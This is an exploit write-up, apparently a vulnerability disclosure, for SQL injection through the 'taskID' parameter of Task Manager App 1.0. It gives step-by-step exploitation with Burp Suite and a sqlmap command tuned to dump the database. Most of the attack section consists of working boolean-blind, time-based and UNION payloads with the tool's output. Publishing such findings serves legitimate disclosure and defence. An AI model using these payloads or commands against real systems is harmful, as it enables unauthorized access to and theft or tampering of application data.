# Task Manager App - SQL Injection - 2
+ **Exploit Title:** Task Manager App - SQL Injection - 2
+ **Date:** 2024-02-02
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://code-projects.org/task-manager-in-php-with-source-code/
+ **Software Link:** https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number.

## Description:
Task Manager App 1.0 allows SQL Injection via the 'taskID' parameter at "/TaskManager/EditTask.php?edit=1&taskID=2". 
Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/TaskManager/"
+ Click on the Tasks button
+ Then click 'Edit' button
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /TaskManager/EditTask.php?edit=1&taskID=2 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36

```
+ Use sqlmap to exploit. In sqlmap, use 'taskID' parameter to dump the database.
```
sqlmap -r r.txt -p taskID --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: taskID (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: edit=1&taskID=2' AND 1616=(SELECT (CASE WHEN (1616=1616) THEN 1616 ELSE (SELECT 4410 UNION SELECT 6898) END))-- -

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: edit=1&taskID=2' AND (SELECT 9057 FROM (SELECT(SLEEP(5)))MRRF)-- hBYo

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: edit=1&taskID=-1797' UNION ALL SELECT NULL,NULL,CONCAT(0x7171766b71,0x5067554356487a4e6c53506c635469456d476a55477675654555645a58564b58504f687065557666,0x71716b7171),NULL,NULL,NULL-- -
---
[20:54:18] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[20:54:18] [INFO] fetching current database
current database: 'TaskManager'
```
+ current database: `TaskManager`

![Ekran görüntüsü 2024-02-02 045540](https://github.com/BurakSevben/CVEs/assets/117217689/92ebfc97-ba32-48d7-aaab-ec3c02cdfad1)

